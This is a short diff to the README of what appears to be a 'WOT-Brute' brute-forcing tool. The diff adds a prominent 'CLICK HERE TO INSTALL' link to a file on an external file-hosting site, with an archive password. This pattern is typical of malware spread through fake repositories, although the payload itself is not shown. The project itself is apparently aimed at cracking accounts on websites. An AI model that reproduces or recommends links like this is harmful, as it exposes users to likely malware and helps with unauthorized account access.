@@ -1,3 +1,6 @@
+[CLICK HERE TO INSTALL|(https://mega.nz/file/hXti0IbR#03joGqGoU8TkmNkFvy-m4qMEUASvq9fmN6LDQFQj_JI)
+[PASS: wot bc]
+
 ![image](https://github.com/skyflowed/WOT-Brute/assets/170162903/2fe96f82-b342-4429-b5d4-db88cd9899be)
 
 The software works with 2 sites:
